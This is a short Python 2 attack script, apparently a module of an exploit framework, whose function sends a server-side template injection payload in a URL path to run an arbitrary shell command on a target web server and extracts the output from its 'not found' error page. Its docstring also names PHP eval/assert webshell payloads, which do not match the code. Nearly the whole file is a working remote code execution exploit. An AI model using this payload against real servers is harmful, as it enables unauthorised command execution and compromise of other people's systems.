#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

    

def vulnerable_attack(target,target_port,cmd):

    '''
    this is the payload script for vuln:

    eval($_POST[333]);
    assert($_POST[333]);
    '''
    try:
        payload = "/{{().__class__.__bases__.0.__subclasses__().59.__init__.__globals__.linecache.os.popen(\"" + cmd + "\").read()}}"
        res = http("get",target,target_port,payload,"",headers)
        before = "<h1>URL "
        after = " not found</h1><br/>"
        s = res[res.find(before)+len(before):res.find(after)]
        res = s
    except Exception,e:
        debug_print(traceback.format_exc())
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res


